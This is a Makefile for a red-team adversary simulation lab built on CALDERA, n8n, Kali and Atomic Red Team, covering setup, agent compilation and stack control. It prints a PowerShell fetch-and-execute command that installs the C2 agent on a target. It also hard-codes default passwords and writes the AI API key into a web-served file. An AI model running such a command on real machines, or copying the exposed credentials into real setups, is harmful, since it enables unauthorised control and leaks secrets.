# =============================================================================
# Sophos Adversary Simulation Platform — Makefile
#
# Usage:
#   make install      → full first-time setup (run this once)
#   make up           → start the stack (auto-detects LabOps mode)
#   make down         → stop the stack
#   make restart      → restart all containers
#   make status       → show container health
#   make logs         → tail all logs
#   make sandcat      → cross-compile sandcat agent for Windows (AMD64)
#   make profiles     → load CALDERA profiles and adversaries
#   make library      → rebuild caldera-library.json from profiles
#   make mitre-update → rebuild mitre-attack.json from ATT&CK data
#   make clean        → stop stack and remove all volumes (destructive!)
# =============================================================================

COMPOSE     = docker compose
CALDERA_CTR = advsim-caldera
GHCR_IMAGE  = ghcr.io/jclark2496/caldera:5.1.0

.DEFAULT_GOAL := help

# ── Help ──────────────────────────────────────────────────────────────────────

.PHONY: help
help:
	@echo ""
	@echo "  Sophos Adversary Simulation Platform — Make targets"
	@echo ""
	@echo "  make install      Full first-time setup (installs all dependencies)"
	@echo "  make up           Start all containers (auto-detects LabOps mode)"
	@echo "  make down         Stop all containers"
	@echo "  make restart      Restart all containers"
	@echo "  make status       Show container health"
	@echo "  make logs         Tail all container logs"
	@echo "  make sandcat      Cross-compile sandcat.go-windows (AMD64)"
	@echo "  make profiles     Load CALDERA profiles and adversaries"
	@echo "  make library      Rebuild caldera-library.json from profiles"
	@echo "  make mitre-update Rebuild mitre-attack.json from ATT&CK data"
	@echo "  make clean        Remove all containers and volumes (destructive)"
	@echo ""

# ── Install (first-time) ──────────────────────────────────────────────────────

.PHONY: install
install: _install-deps _check-docker _env _generate-s-ps1 _setup-ai _setup-tools _detect-labops _generate-caldera-keys _ghcr-auth _pull-caldera _up _wait-healthy _setup-n8n-owner _import-workflows sandcat profiles mitre-update
	@echo ""
	@echo "╔══════════════════════════════════════════════════════════════╗"
	@echo "║   Sophos Adversary Simulation Platform — Ready              ║"
	@echo "╚══════════════════════════════════════════════════════════════╝"
	@echo ""
	@echo "  CALDERA:        http://localhost:8888   (red / admin)"
	@echo "  n8n:            http://localhost:5679"
	@echo "  Guacamole:      http://localhost:8085/guacamole"
	@echo "  SE Front-End:   http://localhost:8081"
	@echo "  Kali SSH:       ssh root@localhost -p 2222"
	@if [ -f .tools-mode ] && grep -q "tools" .tools-mode 2>/dev/null; then \
		echo "  Manual Tools:   Use SE Console buttons for browser terminals"; \
	else \
		echo "  Manual Tools:   Run 'make tools' to install Kali + Atomic Red Team"; \
	fi
	@echo ""
	@echo "  Next steps:"
	@echo "    • LabOps VMs: sandcat is deployed automatically during 'make provision'"
	@echo "    • Manual VM:  on the victim (PowerShell as Admin):"
	@CALDERA_H=$$(grep '^CALDERA_HOST=' .env 2>/dev/null | cut -d'=' -f2); \
	if [ -z "$$CALDERA_H" ]; then CALDERA_H="<your-host-ip>"; fi; \
	echo "       powershell -c \"iex(iwr 'http://$$CALDERA_H:8081/s.ps1' -UseBasicParsing)\""
	@echo ""

# ── Core stack operations ─────────────────────────────────────────────────────

.PHONY: up
up:
	@echo "▶ Starting Adversary Simulation stack..."
	@TOOLS_FLAG=""; \
	if [ -f .tools-mode ] && grep -q "tools" .tools-mode 2>/dev/null; then \
		TOOLS_FLAG="--profile tools"; \
	fi; \
	if [ -f .labops-mode ] && grep -q "labops" .labops-mode 2>/dev/null; then \
		echo "  (LabOps mode — using LabOps Guacamole, own n8n)"; \
		$(COMPOSE) -f docker-compose.yml -f docker-compose.n8n.yml -f docker-compose.override.yml $$TOOLS_FLAG up -d; \
	else \
		echo "  (Standalone mode — including n8n + Guacamole)"; \
		$(COMPOSE) -f docker-compose.yml -f docker-compose.n8n.yml -f docker-compose.guacamole.yml $$TOOLS_FLAG up -d; \
	fi
	@echo "✅ Stack started"
	@# Auto-import n8n workflows if missing (handles restarts / fresh volumes)
	@N8N_CTR=advsim-n8n; \
	echo "▶ Checking n8n workflows ($$N8N_CTR)..."; \
	for i in $$(seq 1 12); do \
		if docker exec $$N8N_CTR ls /home/node/.n8n/database.sqlite > /dev/null 2>&1; then \
			break; \
		fi; \
		sleep 5; \
	done; \
	WF_COUNT=$$(docker exec $$N8N_CTR n8n list:workflow 2>/dev/null | wc -l | tr -d ' '); \
	if [ "$$WF_COUNT" -lt 2 ] 2>/dev/null; then \
		echo "▶ Importing n8n workflows..."; \
		for f in n8n/workflows/*.json; do \
			docker exec -i $$N8N_CTR n8n import:workflow --input=/dev/stdin < "$$f" 2>/dev/null; \
		done; \
		docker exec $$N8N_CTR n8n list:workflow 2>/dev/null | while IFS='|' read wid wname; do \
			docker exec $$N8N_CTR n8n publish:workflow --id="$$wid" > /dev/null 2>&1; \
		done; \
		echo "✅ Workflows imported and activated"; \
	else \
		echo "✅ Workflows loaded ($$WF_COUNT found)"; \
	fi

.PHONY: down
down:
	@echo "■ Stopping Adversary Simulation stack..."
	@TOOLS_FLAG=""; \
	if [ -f .tools-mode ] && grep -q "tools" .tools-mode 2>/dev/null; then \
		TOOLS_FLAG="--profile tools"; \
	fi; \
	if [ -f .labops-mode ] && grep -q "labops" .labops-mode 2>/dev/null; then \
		$(COMPOSE) -f docker-compose.yml -f docker-compose.n8n.yml $$TOOLS_FLAG down; \
	else \
		$(COMPOSE) -f docker-compose.yml -f docker-compose.n8n.yml -f docker-compose.guacamole.yml $$TOOLS_FLAG down; \
	fi
	@echo "✅ Stack stopped"

.PHONY: restart
restart:
	$(COMPOSE) restart

.PHONY: status
status:
	$(COMPOSE) ps

.PHONY: logs
logs:
	$(COMPOSE) logs -f

# ── CALDERA ───────────────────────────────────────────────────────────────────

.PHONY: sandcat
sandcat:
	@echo "▶ Cross-compiling sandcat.go-windows for AMD64..."
	@docker exec $(CALDERA_CTR) bash -c \
		"cd /usr/src/app/plugins/sandcat/gocat && \
		 GOOS=windows GOARCH=amd64 go build \
		   -o /usr/src/app/plugins/sandcat/payloads/sandcat.go-windows \
		   sandcat.go" \
	&& echo "✅ sandcat.go-windows compiled (AMD64)" \
	|| echo "⚠️  Sandcat build failed — is $(CALDERA_CTR) running? Try: make up"

.PHONY: workflows
workflows: _import-workflows
	@echo "✅ Workflows re-imported and activated"

.PHONY: profiles
profiles:
	@echo "▶ Loading CALDERA profiles and adversaries..."
	@if python3 caldera-profiles/load_profiles.py 2>/dev/null; then \
		echo "✅ CALDERA profiles loaded"; \
	else \
		echo "⚠️  Profile load failed — is $(CALDERA_CTR) running and healthy?"; \
	fi

.PHONY: library
library:
	@echo "▶ Rebuilding CALDERA scenario library index..."
	@if python3 scripts/build-library.py; then \
		echo "✅ caldera-library.json updated"; \
	else \
		echo "⚠️  Library build failed — check caldera-profiles/ directory"; \
	fi

.PHONY: mitre-update
mitre-update:
	@echo "▶ Rebuilding MITRE ATT&CK technique index..."
	@if python3 scripts/build-mitre-attack.py; then \
		echo "✅ mitre-attack.json updated"; \
	else \
		echo "⚠️  MITRE update failed — check internet connection"; \
	fi

# ── Internal helpers ──────────────────────────────────────────────────────────

# ── Dependency Installation ─────────────────────────────────────────────────

.PHONY: _install-deps
_install-deps:
	@echo ""
	@echo "╔══════════════════════════════════════════════════════════════╗"
	@echo "║  Adversary Sim — Installing Dependencies                    ║"
	@echo "╚══════════════════════════════════════════════════════════════╝"
	@echo ""
	@# ── WSL 2 filesystem warning ──
	@if grep -qi "microsoft\|wsl" /proc/version 2>/dev/null; then \
		if echo "$$PWD" | grep -q "^/mnt/[a-z]/"; then \
			echo "⚠️  WARNING: Repo is on the Windows filesystem (slow I/O)."; \
			echo "   For best performance, clone inside WSL 2: cd ~ && git clone ..."; \
			echo ""; \
		fi; \
		if ! command -v pip3 >/dev/null 2>&1; then \
			echo "▶ Installing pip3 (needed for Python packages)..."; \
			sudo apt-get update -qq && sudo apt-get install -y python3-pip; \
		fi; \
	fi
	@# ── Package manager (macOS only) ──
	@if [ "$$(uname)" = "Darwin" ]; then \
		if command -v brew >/dev/null 2>&1; then \
			echo "✅ Homebrew is installed"; \
		else \
			echo "▶ Installing Homebrew..."; \
			/bin/bash -c "$$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"; \
			echo "✅ Homebrew installed"; \
		fi; \
	fi
	@# ── Docker ──
	@if command -v docker >/dev/null 2>&1; then \
		echo "✅ Docker is installed"; \
	else \
		if [ "$$(uname)" = "Darwin" ]; then \
			echo "▶ Installing Docker Desktop..."; \
			brew install --cask docker; \
			echo "✅ Docker Desktop installed"; \
			echo ""; \
			echo "⚠️  Docker Desktop needs to be started manually the first time."; \
			echo "   Please open Docker Desktop from your Applications folder,"; \
			echo "   wait for it to finish starting, then run 'make install' again."; \
			echo ""; \
			exit 1; \
		else \
			echo "▶ Installing Docker Engine..."; \
			curl -fsSL https://get.docker.com | sh; \
			sudo systemctl start docker 2>/dev/null || sudo service docker start 2>/dev/null || true; \
			sudo usermod -aG docker $$USER 2>/dev/null || true; \
			echo "✅ Docker Engine installed"; \
		fi; \
	fi
	@# ── Python packages ──
	@echo "▶ Checking Python packages..."
	@pip3 install -q requests pyyaml 2>/dev/null || \
		pip3 install --user -q requests pyyaml 2>/dev/null || \
		echo "⚠️  Could not install Python packages. Run manually: pip3 install requests pyyaml"
	@echo "✅ Python packages ready"
	@echo ""

.PHONY: _setup-ai
_setup-ai:
	@echo ""
	@echo "▶ AI Provider Setup"
	@echo "  Select your AI provider for scenario enrichment:"
	@echo ""
	@echo "  1) Anthropic Claude (recommended)"
	@echo "  2) OpenAI"
	@echo "  3) Google Gemini"
	@echo "  4) Local model via Ollama (free, no API key)"
	@echo "  5) Skip — configure later in Settings"
	@echo ""
	@read -p "  Choice [1-5]: " choice; \
	case $$choice in \
		1) provider=anthropic; label="Anthropic Claude"; needs_key=true ;; \
		2) provider=openai; label="OpenAI"; needs_key=true ;; \
		3) provider=gemini; label="Google Gemini"; needs_key=true ;; \
		4) provider=ollama; label="Local Ollama"; needs_key=false ;; \
		*) provider=; label="Skipped"; needs_key=false ;; \
	esac; \
	api_key=""; \
	if [ "$$needs_key" = "true" ]; then \
		read -p "  Enter your API key: " api_key; \
	fi; \
	if [ "$$(uname)" = "Darwin" ]; then \
		sed -i '' "s/^AI_PROVIDER=.*/AI_PROVIDER=$$provider/" .env; \
		sed -i '' "s/^AI_API_KEY=.*/AI_API_KEY=$$api_key/" .env; \
	else \
		sed -i "s/^AI_PROVIDER=.*/AI_PROVIDER=$$provider/" .env; \
		sed -i "s/^AI_API_KEY=.*/AI_API_KEY=$$api_key/" .env; \
	fi; \
	case "$$provider" in \
		anthropic) dflt_model="claude-sonnet-4-6" ;; \
		openai)    dflt_model="gpt-4o" ;; \
		gemini)    dflt_model="gemini-2.5-flash" ;; \
		*)         dflt_model="" ;; \
	esac; \
	printf '{"provider":"%s","apiKey":"%s","model":"%s"}' "$$provider" "$$api_key" "$$dflt_model" > nginx/html/ai-config.json; \
	echo "✅ AI provider: $$label"; \
	if [ "$$provider" = "ollama" ]; then \
		$(MAKE) _setup-ollama; \
	fi

.PHONY: _setup-tools
_setup-tools:
	@echo ""
	@read -p "  Install Manual Attack Tools — Kali + Atomic Red Team? [y/N]: " tools_choice; \
	if [ "$$tools_choice" = "y" ] || [ "$$tools_choice" = "Y" ]; then \
		echo "tools" > .tools-mode; \
		echo "✅ Manual tools will be installed"; \
	else \
		echo "" > .tools-mode; \
		echo "  Skipped — run 'make tools' anytime to install later"; \
	fi

.PHONY: _check-docker
_check-docker:
	@echo "▶ Verifying Docker..."
	@docker info > /dev/null 2>&1 || (echo "❌ Docker is not running. Start Docker Desktop first." && exit 1)
	@echo "✅ Docker is running"
	@docker compose version > /dev/null 2>&1 || (echo "❌ Docker Compose not found. Update Docker Desktop." && exit 1)
	@echo "✅ Docker Compose available"

.PHONY: _setup-ollama
_setup-ollama:
	@# ── Install Ollama if missing ──
	@if command -v ollama >/dev/null 2>&1; then \
		echo "✅ Ollama is installed"; \
	else \
		echo "▶ Installing Ollama..."; \
		brew install ollama 2>/dev/null || \
			(curl -fsSL https://ollama.com/install.sh | sh); \
		echo "✅ Ollama installed"; \
	fi
	@# ── Start Ollama if not running ──
	@if curl -s http://localhost:11434/api/tags > /dev/null 2>&1; then \
		echo "✅ Ollama is running"; \
	else \
		echo "▶ Starting Ollama..."; \
		if [ "$$(uname)" = "Darwin" ]; then \
			open -a Ollama 2>/dev/null || ollama serve &>/dev/null & \
		else \
			ollama serve &>/dev/null & \
		fi; \
		echo "   Waiting for Ollama to start..."; \
		for i in $$(seq 1 12); do \
			if curl -s http://localhost:11434/api/tags > /dev/null 2>&1; then \
				echo "✅ Ollama is running"; \
				break; \
			fi; \
			if [ $$i -eq 12 ]; then \
				echo "⚠️  Ollama did not start. Run manually: ollama serve"; \
			fi; \
			sleep 2; \
		done; \
	fi
	@# ── Pull model if not already downloaded ──
	@MODEL=$${OLLAMA_MODEL:-llama3.2:3b}; \
	if ollama list 2>/dev/null | grep -q "$$MODEL"; then \
		echo "✅ Ollama model $$MODEL is ready"; \
	else \
		echo "▶ Pulling Ollama model $$MODEL (this may take a few minutes)..."; \
		ollama pull $$MODEL 2>/dev/null && \
			echo "✅ Model $$MODEL pulled" || \
			echo "⚠️  Could not pull model. Run manually: ollama pull $$MODEL"; \
	fi

.PHONY: _env
_env:
	@if [ ! -f .env ]; then \
		if [ -f .env.example ]; then \
			cp .env.example .env; \
			echo "⚠️  Created .env from template — edit it before proceeding"; \
		else \
			echo "❌ No .env or .env.example found"; \
			exit 1; \
		fi; \
	else \
		echo "✅ .env exists"; \
	fi
	@N8N_PW=$$(grep '^N8N_PASSWORD=' .env 2>/dev/null | cut -d'=' -f2-); \
	if [ -z "$$N8N_PW" ]; then \
		echo "   Generating N8N_PASSWORD..."; \
		NEW_PW=$$(python3 -c "import secrets; print(secrets.token_urlsafe(16))"); \
		if [ "$$(uname)" = "Darwin" ]; then \
			sed -i '' "s/^N8N_PASSWORD=.*/N8N_PASSWORD=$$NEW_PW/" .env; \
		else \
			sed -i "s/^N8N_PASSWORD=.*/N8N_PASSWORD=$$NEW_PW/" .env; \
		fi; \
		echo "✅ N8N_PASSWORD auto-generated: $$NEW_PW"; \
	else \
		echo "✅ N8N_PASSWORD is set"; \
	fi

.PHONY: _generate-s-ps1
_generate-s-ps1:
	@echo "▶ Generating s.ps1 from template..."
	@CALDERA_H=$$(grep '^CALDERA_HOST=' .env 2>/dev/null | cut -d'=' -f2); \
	if [ -z "$$CALDERA_H" ]; then \
		CALDERA_H=$$(hostname -I 2>/dev/null | awk '{print $$1}' || ipconfig getifaddr en0 2>/dev/null || echo "localhost"); \
		echo "   CALDERA_HOST not set in .env — auto-detected: $$CALDERA_H"; \
		echo "   (Set CALDERA_HOST in .env to override — required for VPS or remote installs)"; \
	fi; \
	if [ "$$(uname)" = "Darwin" ]; then \
		sed "s/CALDERA_HOST/$$CALDERA_H/g" nginx/html/s.ps1.tpl > nginx/html/s.ps1; \
	else \
		sed "s/CALDERA_HOST/$$CALDERA_H/g" nginx/html/s.ps1.tpl > nginx/html/s.ps1; \
	fi; \
	echo "✅ s.ps1 generated (CALDERA_HOST=$$CALDERA_H)"

.PHONY: _detect-labops
_detect-labops:
	@echo "▶ Detecting deployment mode..."
	@if [ -x scripts/detect-labops.sh ]; then \
		scripts/detect-labops.sh > .labops-mode; \
	else \
		echo "standalone" > .labops-mode; \
	fi
	@MODE=$$(cat .labops-mode); \
	if [ "$$MODE" = "labops" ]; then \
		echo "✅ LabOps detected — joining labops-net network"; \
		echo "  → Using own n8n (advsim-n8n) for scenario workflows"; \
		echo "  → Skipping Guacamole (using LabOps instance)"; \
		printf 'networks:\n  advsim-net:\n    external: true\n    name: labops-net\n' > docker-compose.override.yml; \
		sed 's/GUAC_HOST/labops-guacamole/' nginx/conf/default.conf.tpl > nginx/conf/default.conf; \
		echo "  → nginx proxying Guacamole to labops-guacamole"; \
		if [ -f nginx/html/ai-config.json ]; then \
			HOST_IP=$$(hostname -I 2>/dev/null | awk '{print $$1}' || ipconfig getifaddr en0 2>/dev/null || echo "localhost"); \
			python3 -c "import json,sys; c=json.load(open('nginx/html/ai-config.json')); c['labopsUrl']='http://'+sys.argv[1]+':8080'; open('nginx/html/ai-config.json','w').write(json.dumps(c))" "$$HOST_IP"; \
			echo "  → labopsUrl set to http://$$HOST_IP:8080 in ai-config.json"; \
		fi; \
	else \
		echo "✅ Standalone mode — using advsim-net network"; \
		rm -f docker-compose.override.yml; \
		sed 's/GUAC_HOST/advsim-guacamole/' nginx/conf/default.conf.tpl > nginx/conf/default.conf; \
		echo "  → nginx proxying Guacamole to advsim-guacamole"; \
	fi

.PHONY: _generate-caldera-keys
_generate-caldera-keys:
	@echo "▶ Checking CALDERA crypto keys..."
	@if grep -q 'PLACEHOLDER_SALT_REPLACE_ON_INSTALL' caldera/conf/local.yml 2>/dev/null; then \
		NEW_SALT=$$(python3 -c "import secrets; print(secrets.token_hex(32))"); \
		if [ "$$(uname)" = "Darwin" ]; then \
			sed -i '' "s/PLACEHOLDER_SALT_REPLACE_ON_INSTALL/$$NEW_SALT/g" caldera/conf/local.yml; \
		else \
			sed -i "s/PLACEHOLDER_SALT_REPLACE_ON_INSTALL/$$NEW_SALT/g" caldera/conf/local.yml; \
		fi; \
		echo "✅ Generated new crypt_salt"; \
	else \
		echo "✅ crypt_salt already set"; \
	fi
	@if grep -q 'PLACEHOLDER_KEY_REPLACE_ON_INSTALL' caldera/conf/local.yml 2>/dev/null; then \
		NEW_KEY=$$(python3 -c "import secrets; print(secrets.token_hex(32))"); \
		if [ "$$(uname)" = "Darwin" ]; then \
			sed -i '' "s/PLACEHOLDER_KEY_REPLACE_ON_INSTALL/$$NEW_KEY/g" caldera/conf/local.yml; \
		else \
			sed -i "s/PLACEHOLDER_KEY_REPLACE_ON_INSTALL/$$NEW_KEY/g" caldera/conf/local.yml; \
		fi; \
		echo "✅ Generated new encryption_key"; \
	else \
		echo "✅ encryption_key already set"; \
	fi

.PHONY: _ghcr-auth
_ghcr-auth:
	@# ── GitHub CLI (for GHCR auth) ──
	@if command -v gh >/dev/null 2>&1; then \
		echo "✅ GitHub CLI is installed"; \
	else \
		echo "▶ Installing GitHub CLI..."; \
		if [ "$$(uname)" = "Darwin" ]; then \
			brew install gh; \
		elif command -v apt-get >/dev/null 2>&1; then \
			curl -fsSL https://cli.github.com/packages/githubcli-archive-keyring.gpg | sudo dd of=/usr/share/keyrings/githubcli-archive-keyring.gpg 2>/dev/null; \
			echo "deb [arch=$$(dpkg --print-architecture) signed-by=/usr/share/keyrings/githubcli-archive-keyring.gpg] https://cli.github.com/packages stable main" | sudo tee /etc/apt/sources.list.d/github-cli.list > /dev/null; \
			sudo apt-get update -qq && sudo apt-get install -y gh; \
		elif command -v dnf >/dev/null 2>&1; then \
			sudo dnf install -y gh; \
		else \
			echo "⚠️  Could not install GitHub CLI. Install manually: https://cli.github.com"; \
		fi; \
		echo "✅ GitHub CLI installed"; \
	fi
	@# ── GHCR Authentication ──
	@if docker pull --quiet ghcr.io/jclark2496/caldera:5.1.0 > /dev/null 2>&1; then \
		echo "✅ GHCR authentication verified"; \
	else \
		echo "▶ Authenticating to GitHub Container Registry..."; \
		echo "  You need a GitHub account with access to jclark2496/caldera"; \
		gh auth login; \
		gh auth refresh -s read:packages; \
		echo $$(gh auth token) | docker login ghcr.io -u jclark2496 --password-stdin; \
	fi

.PHONY: _pull-caldera
_pull-caldera:
	@echo "▶ Pulling CALDERA image from GHCR..."
	@docker pull $(GHCR_IMAGE) \
	&& docker tag $(GHCR_IMAGE) caldera:local \
	&& echo "✅ CALDERA image ready ($(GHCR_IMAGE))" \
	|| (echo "❌ Failed to pull CALDERA from GHCR." && \
	    echo "   If repo is private, authenticate first:" && \
	    echo "     gh auth refresh -s read:packages" && \
	    echo "     echo \$$(gh auth token) | docker login ghcr.io -u jclark2496 --password-stdin" && \
	    exit 1)

.PHONY: _up
_up:
	@echo "▶ Starting containers..."
	@TOOLS_FLAG=""; \
	if [ -f .tools-mode ] && grep -q "tools" .tools-mode 2>/dev/null; then \
		TOOLS_FLAG="--profile tools"; \
	fi; \
	if [ -f .labops-mode ] && grep -q "labops" .labops-mode 2>/dev/null; then \
		echo "  (LabOps mode — using LabOps Guacamole, own n8n)"; \
		$(COMPOSE) -f docker-compose.yml -f docker-compose.n8n.yml -f docker-compose.override.yml $$TOOLS_FLAG up -d; \
	else \
		echo "  (Standalone mode — including n8n + Guacamole)"; \
		$(COMPOSE) -f docker-compose.yml -f docker-compose.n8n.yml -f docker-compose.guacamole.yml $$TOOLS_FLAG up -d; \
	fi

.PHONY: _wait-healthy
_wait-healthy:
	@echo "▶ Waiting for CALDERA to be healthy (up to 120s)..."
	@for i in $$(seq 1 24); do \
		if docker inspect --format='{{.State.Health.Status}}' $(CALDERA_CTR) 2>/dev/null | grep -q healthy; then \
			echo "✅ CALDERA is healthy"; \
			break; \
		fi; \
		if [ $$i -eq 24 ]; then \
			echo "⚠️  CALDERA health check timed out — it may still be initializing"; \
			echo "   Check with: docker compose logs -f caldera"; \
		fi; \
		printf "."; \
		sleep 5; \
	done

.PHONY: _setup-n8n-owner
_setup-n8n-owner:
	@echo "▶ Configuring n8n owner account..."
	@N8N_PORT=$$(grep '^N8N_PORT=' .env 2>/dev/null | cut -d'=' -f2-); \
	N8N_PORT=$${N8N_PORT:-5679}; \
	N8N_PW=$$(grep '^N8N_PASSWORD=' .env 2>/dev/null | cut -d'=' -f2-); \
	N8N_PW=$${N8N_PW:-Demo1234!}; \
	echo "  Waiting for n8n HTTP..."; \
	for i in $$(seq 1 24); do \
		if curl -sf "http://localhost:$$N8N_PORT/healthz" > /dev/null 2>&1; then \
			break; \
		fi; \
		if [ $$i -eq 24 ]; then \
			echo "⚠️  n8n not reachable — skipping owner setup"; \
			exit 0; \
		fi; \
		printf "."; \
		sleep 5; \
	done; \
	HTTP_CODE=$$(curl -s -o /dev/null -w "%{http_code}" -X POST \
		"http://localhost:$$N8N_PORT/api/v1/owner/setup" \
		-H "Content-Type: application/json" \
		-d "{\"email\":\"admin@lab.local\",\"firstName\":\"SE\",\"lastName\":\"Admin\",\"password\":\"$$N8N_PW\"}" \
		2>/dev/null); \
	if [ "$$HTTP_CODE" = "200" ]; then \
		echo "✅ n8n owner account created (admin@lab.local / $$N8N_PW)"; \
	else \
		echo "✅ n8n already configured"; \
	fi

.PHONY: _import-workflows
_import-workflows:
	@echo "▶ Importing n8n workflows into advsim-n8n..."
	@echo "  Waiting for advsim-n8n to be ready..."
	@for i in $$(seq 1 24); do \
		if docker exec advsim-n8n ls /home/node/.n8n/database.sqlite > /dev/null 2>&1; then \
			break; \
		fi; \
		if [ $$i -eq 24 ]; then \
			echo "⚠️  n8n not reachable — skipping workflow import"; \
			exit 0; \
		fi; \
		sleep 5; \
	done
	@for f in n8n/workflows/*.json; do \
		WF_NAME=$$(basename "$$f" .json); \
		echo "  Importing $$WF_NAME..."; \
		docker exec -i advsim-n8n n8n import:workflow --input=/dev/stdin < "$$f" 2>/dev/null && \
			echo "    ✅ $$WF_NAME imported" || \
			echo "    ⚠️  $$WF_NAME import failed"; \
	done
	@echo "▶ Activating workflows..."
	@docker exec advsim-n8n n8n list:workflow 2>/dev/null | while IFS='|' read wid wname; do \
		docker exec advsim-n8n n8n publish:workflow --id="$$wid" > /dev/null 2>&1; \
	done
	@docker compose -f docker-compose.yml -f docker-compose.n8n.yml restart n8n > /dev/null 2>&1
	@echo "✅ Workflow import complete"

# ── Cleanup ───────────────────────────────────────────────────────────────────

.PHONY: clean
clean:
	@echo "⚠️  This will stop all containers and delete all volumes."
	@read -p "Are you sure? [y/N] " confirm && [ "$$confirm" = "y" ] || exit 0
	@if [ -f .labops-mode ] && grep -q "labops" .labops-mode 2>/dev/null; then \
		$(COMPOSE) -f docker-compose.yml -f docker-compose.n8n.yml down -v; \
	else \
		$(COMPOSE) -f docker-compose.yml -f docker-compose.n8n.yml -f docker-compose.guacamole.yml down -v; \
	fi
	@echo "✅ All containers and volumes removed"

# ── Manual Attack Tools ────────────────────────────────────────────────────────

.PHONY: tools
tools:
	@echo "▶ Installing Manual Attack Tools (Kali + Atomic Red Team)..."
	@echo "tools" > .tools-mode
	@if [ -f .labops-mode ] && grep -q "labops" .labops-mode 2>/dev/null; then \
		$(COMPOSE) -f docker-compose.yml -f docker-compose.n8n.yml -f docker-compose.override.yml --profile tools up -d kali atomic-runner; \
	else \
		$(COMPOSE) -f docker-compose.yml -f docker-compose.n8n.yml -f docker-compose.guacamole.yml --profile tools up -d kali atomic-runner; \
	fi
	@echo ""
	@echo "✅ Manual Attack Tools installed"
	@echo ""
	@echo "  Kali Terminal:      ssh root@localhost -p 2222  (password: kali)"
	@echo "  Atomic Red Team:    ssh root@localhost          (password: atomic)"
	@echo ""
	@echo "  Or use the Manual Tools buttons in the SE Console for browser-based terminals."
